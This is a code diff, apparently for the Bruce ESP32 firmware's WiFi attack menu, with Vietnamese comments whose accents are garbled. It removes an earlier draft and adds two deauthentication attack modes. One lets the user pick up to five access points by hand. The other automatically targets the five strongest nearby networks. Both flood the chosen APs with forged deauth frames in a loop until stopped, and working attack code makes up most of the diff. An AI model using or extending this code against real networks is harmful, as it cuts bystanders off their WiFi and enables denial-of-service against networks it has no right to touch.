@@ -20,7 +20,7 @@
 #include <Arduino.h>
 #include <globals.h>
 #include <nvs_flash.h>
-#include <algorithm> // Thêm dòng này d? dùng std::sort
+#include <algorithm>
 
 #define WIFI_ATK_NAME "BruceAttack"
 extern bool showHiddenNetworks;
@@ -289,7 +289,7 @@ void wifi_atk_menu() {
         {"Beacon SPAM",  [=]() { beaconAttack(); }     },
         {"Deauth Flood", [=]() { deauthFloodAttack(); }},
         
-        // --- THÊM 2 DÒNG NÀY VÀO ---
+        // --- B?N THÊM 2 DÒNG NÀY VÀO ---
         {"Deauth Multi", [=]() { deauthMultiAttack(); }},
         {"Deauth Top 5", [=]() { deauthTop5Attack(); }},
     };
@@ -834,29 +834,7 @@ void target_atk(String tssid, String mac, uint8_t channel) {
 void generateRandomWiFiMac(uint8_t *mac) {
     for (int i = 1; i < 6; i++) { mac[i] = random(0, 255); }
 }
-void deauthMultiAttack() {
-    displayTextLine("Scanning..");
-    int nets = WiFi.scanNetworks(false, showHiddenNetworks);
-    
-    std::vector<wifi_ap_record_t> all_targets;
-    for (int i = 0; i < nets; i++) {
-        wifi_ap_record_t r;
-        memset(&r, 0, sizeof(r));
-        memcpy(r.bssid, WiFi.BSSID(i), 6);
-        r.primary = static_cast<uint8_t>(WiFi.channel(i));
-        // B?n có th? l?y thêm SSID n?u sau này mu?n hi?n th? tên AP dang b? deauth
-        if (strlen(WiFi.SSID(i).c_str()) > 0) {
-            strncpy((char *)r.ssid, WiFi.SSID(i).c_str(), sizeof(r.ssid) - 1);
-            r.ssid[sizeof(r.ssid) - 1] = '\0';
-        } else {
-            r.ssid[0] = '\0';
-        }
-        all_targets.push_back(r);
-    }
-    
-    // Ð?y toàn b? danh sách quét du?c vào Engine Bruce
-    execute_multi_bruce_style(all_targets); 
-}
+
 char randomName[32];
 char *randomSSID() {
     const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
@@ -966,71 +944,6 @@ void beaconSpamList(const char list[]) {
         i += j;
         if (EscPress) break;
     }
-}
-// --- HÀM MULTI-DEAUTH (S? D?NG ENGINE G?C C?A BRUCE) ---
-void execute_multi_bruce_style(const std::vector<wifi_ap_record_t>& targets) {
-    if (targets.empty()) return;
-    resetGlobalState();
-    
-    // T?t WebUI d? tránh xung d?t tài nguyên m?ng
-    cleanlyStopWebUiForWiFiFeature(); 
-    if (!wifi_atk_setWifi()) return;
-
-    drawMainBorderWithTitle("Multi-Deauth (Bruce)");
-    tft.setCursor(10, 50);
-    tft.println("Attacking " + String(targets.size()) + " APs...");
-
-    // Kh?i t?o khung (frame) m?c d?nh c?a Bruce
-    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
-
-    while (true) {
-        for (const auto &target : targets) {
-            // 1. G?i hàm chu?n b? d?n & nh?y kênh c?a Bruce g?c
-            wsl_bypasser_send_raw_frame(&target, target.primary, _default_target);
-
-            // 2. G?i hàm b?n c?a Bruce g?c (B?n 10 vòng, m?i vòng 3 gói = 30 gói / AP)
-            for (int i = 0; i < 10; i++) {
-                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
-                if (check(EscPress)) break;
-            }
-
-            // 3. ÐI?M S?NG CÒN CHO C5: Ngh? 10ms gi?a m?i AP d? không b? treo
-            vTaskDelay(pdMS_TO_TICKS(10));
-            if (check(EscPress)) break;
-        }
-        
-        if (check(EscPress)) break;
-        // Ngh? 50ms sau khi quét xong 1 vòng t?t c? m?c tiêu
-        vTaskDelay(pdMS_TO_TICKS(50)); 
-    }
-
-    wifi_atk_unsetWifi();
-    returnToMenu = true;
-}
-
-// --- TÍNH NANG 1: TOP 5 RSSI ---
-void deauthTop5Attack() {
-    displayTextLine("Scanning..");
-    int nets = WiFi.scanNetworks(false, showHiddenNetworks);
-    std::vector<wifi_ap_record_t> temp_list;
-    for (int i = 0; i < nets; i++) {
-        wifi_ap_record_t r;
-        memset(&r, 0, sizeof(r));
-        memcpy(r.bssid, WiFi.BSSID(i), 6);
-        r.primary = static_cast<uint8_t>(WiFi.channel(i));
-        r.rssi = WiFi.RSSI(i);
-        temp_list.push_back(r);
-    }
-    // S?p x?p sóng kh?e d?ng d?u
-    std::sort(temp_list.begin(), temp_list.end(), [](const wifi_ap_record_t& a, const wifi_ap_record_t& b) {
-        return a.rssi > b.rssi;
-    });
-    
-    std::vector<wifi_ap_record_t> top5;
-    for (int i = 0; i < std::min((int)temp_list.size(), 5); i++) top5.push_back(temp_list[i]);
-    
-    // G?I HÀM BRUCE STYLE
-    execute_multi_bruce_style(top5); 
 }
 
 void beaconSpamSingle(String baseSSID) {
@@ -1168,4 +1081,199 @@ void beaconAttack() {
         }
     }
     wifi_atk_unsetWifi();
+}
+
+
+
+// =========================================================================
+// CÁC HÀM THÊM M?I (B?N COPY VÀ DÁN XU?NG DU?I CÙNG C?A FILE NHÉ)
+// =========================================================================
+
+// 1. ENGINE ÐÁNH MULTI (UI TINH 100% - CH? V? 1 L?N, IN DANH SÁCH M?C TIÊU)
+void execute_multi_bruce_style(const std::vector<wifi_ap_record_t>& targets) {
+    if (targets.empty()) {
+        displayTextLine("No APs found!");
+        delay(1000);
+        wifi_atk_unsetWifi();
+        returnToMenu = true;
+        return;
+    }
+
+    // --- V? UI TINH TRU?C KHI T?N CÔNG ---
+    drawMainBorderWithTitle("Multi-Deauth");
+    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+    
+    tft.setCursor(10, 40);
+    tft.println("Attacking " + String(targets.size()) + " Targets:");
+
+    int startY = 60;
+    for (size_t i = 0; i < targets.size(); i++) {
+        String ssid_str = String((char*)targets[i].ssid);
+        if (ssid_str.length() == 0) ssid_str = "HIDDEN";
+        if (ssid_str.length() > 16) ssid_str = ssid_str.substring(0, 16) + ".."; // C?t ch? dài ch?ng tràn màn hình
+        
+        tft.setCursor(10, startY + (i * 18));
+        tft.println("- " + ssid_str + " (Ch" + String(targets[i].primary) + ")");
+    }
+
+    tft.setCursor(10, tftHeight - 20);
+    tft.println("Press Back/Esc to Stop");
+    // ------------------------------------
+
+    // N?p d?n
+    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+
+    // VÒNG L?P T?N CÔNG (S?CH S?, CPU KHÔNG PH?I GÁNH L?NH V? TFT)
+    while (true) {
+        for (const auto &target : targets) {
+            wsl_bypasser_send_raw_frame(&target, target.primary, _default_target);
+
+            for (int i = 0; i < 10; i++) {
+                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+                if (check(EscPress)) break;
+            }
+
+            // Ngh? 15ms an toàn
+            vTaskDelay(pdMS_TO_TICKS(15));
+            if (check(EscPress)) break;
+        }
+        
+        if (check(EscPress)) break;
+        // Ngh? 100ms vòng l?p l?n
+        vTaskDelay(pdMS_TO_TICKS(100)); 
+    }
+
+    wifi_atk_unsetWifi();
+    returnToMenu = true;
+}
+
+// 2. TÍNH NANG TOP 5 SÓNG KH?E
+void deauthTop5Attack() {
+    // B?t WiFi TRU?C KHI Scan
+    cleanlyStopWebUiForWiFiFeature();
+    resetGlobalState();
+    if (!wifi_atk_setWifi()) return;
+
+    displayTextLine("Scanning..");
+    int nets = WiFi.scanNetworks(false, showHiddenNetworks);
+    
+    std::vector<wifi_ap_record_t> temp_list;
+    for (int i = 0; i < nets; i++) {
+        wifi_ap_record_t r;
+        memset(&r, 0, sizeof(r));
+        memcpy(r.bssid, WiFi.BSSID(i), 6);
+        r.primary = static_cast<uint8_t>(WiFi.channel(i));
+        r.rssi = WiFi.RSSI(i);
+        
+        if (strlen(WiFi.SSID(i).c_str()) > 0) {
+            strncpy((char *)r.ssid, WiFi.SSID(i).c_str(), sizeof(r.ssid) - 1);
+            r.ssid[sizeof(r.ssid) - 1] = '\0';
+        } else {
+            r.ssid[0] = '\0';
+        }
+        
+        temp_list.push_back(r);
+    }
+    
+    std::sort(temp_list.begin(), temp_list.end(), [](const wifi_ap_record_t& a, const wifi_ap_record_t& b) {
+        return a.rssi > b.rssi;
+    });
+    
+    std::vector<wifi_ap_record_t> top5;
+    for (int i = 0; i < std::min((int)temp_list.size(), 5); i++) {
+        top5.push_back(temp_list[i]);
+    }
+    
+    execute_multi_bruce_style(top5); 
+}
+
+// 3. TÍNH NANG MULTI (CH?N TAY MAX 5)
+void deauthMultiAttack() {
+    // B?t WiFi TRU?C KHI Scan
+    cleanlyStopWebUiForWiFiFeature();
+    resetGlobalState();
+    if (!wifi_atk_setWifi()) return;
+
+    displayTextLine("Scanning..");
+    int nets = WiFi.scanNetworks(false, showHiddenNetworks);
+    
+    if (nets == 0) {
+        displayTextLine("No APs found!");
+        delay(1000);
+        wifi_atk_unsetWifi();
+        returnToMenu = true;
+        return;
+    }
+    
+    std::vector<wifi_ap_record_t> scanned_aps;
+    std::vector<bool> selected(nets, false); 
+    int selected_count = 0;
+
+    for (int i = 0; i < nets; i++) {
+        wifi_ap_record_t r;
+        memset(&r, 0, sizeof(r));
+        memcpy(r.bssid, WiFi.BSSID(i), 6);
+        r.primary = static_cast<uint8_t>(WiFi.channel(i));
+        
+        if (strlen(WiFi.SSID(i).c_str()) > 0) {
+            strncpy((char *)r.ssid, WiFi.SSID(i).c_str(), sizeof(r.ssid) - 1);
+            r.ssid[sizeof(r.ssid) - 1] = '\0';
+        } else {
+            r.ssid[0] = '\0';
+        }
+        scanned_aps.push_back(r);
+    }
+    
+    bool start_attack = false;
+    std::vector<String> display_strings;
+
+    while (!start_attack && !returnToMenu) {
+        options.clear();
+        display_strings.clear();
+
+        // Nút Start
+        String startBtn = "-> START ATTACK (" + String(selected_count) + "/5) <-";
+        display_strings.push_back(startBtn);
+        options.push_back({display_strings.back().c_str(), [&]() {
+            if (selected_count > 0) start_attack = true; 
+        }});
+
+        for (int i = 0; i < nets; i++) {
+            String prefix = selected[i] ? "[X] " : "[ ] ";
+            String ssid_str = String((char*)scanned_aps[i].ssid);
+            if (ssid_str.length() == 0) ssid_str = "HIDDEN";
+            
+            String optText = prefix + ssid_str + " (Ch:" + String(scanned_aps[i].primary) + ")";
+            display_strings.push_back(optText);
+
+            options.push_back({display_strings.back().c_str(), [&selected, &selected_count, i]() {
+                if (selected[i]) {
+                    selected[i] = false;
+                    selected_count--;
+                } else if (selected_count < 5) {
+                    selected[i] = true;
+                    selected_count++;
+                }
+            }});
+        }
+
+        addOptionToMainMenu();
+        loopOptions(options); 
+
+        if (check(EscPress)) {
+            returnToMenu = true;
+            break;
+        }
+    }
+
+    if (start_attack) {
+        std::vector<wifi_ap_record_t> final_targets;
+        for (int i = 0; i < nets; i++) {
+            if (selected[i]) final_targets.push_back(scanned_aps[i]);
+        }
+        execute_multi_bruce_style(final_targets); 
+    } else {
+        wifi_atk_unsetWifi();
+        returnToMenu = true;
+    }
 }
